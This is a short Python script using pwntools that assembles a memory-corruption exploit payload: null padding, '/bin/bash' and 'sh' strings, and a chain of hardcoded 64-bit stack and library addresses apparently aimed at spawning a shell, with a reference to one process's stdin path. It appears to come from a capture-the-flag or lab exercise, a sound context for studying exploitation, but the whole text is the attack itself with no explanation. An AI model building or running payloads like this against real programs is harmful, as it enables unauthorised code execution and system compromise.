from pwn import *
import os
import pty

pid = 22636
fd_path = f"/proc/{pid}/fd/0"

bin_sh = b"/bin/bash\0" + b"\0" * 54
arg = b"sh\0" + b"\0" * 61
payload = (
    arg
    + bin_sh
    + b"\0" * 64
    + b"\0" * 2 * 64
    + b"\0" * 16
    + p64(0x7FFFFFFFD8FC)
    + p64(0x7FFFF7EA3440)
    + p64(0x7FFFF7EA3440)
    + p64(0x7FFFF7EA3440)
    + p64(0x7FFFF7E1A490)
)

print(payload)
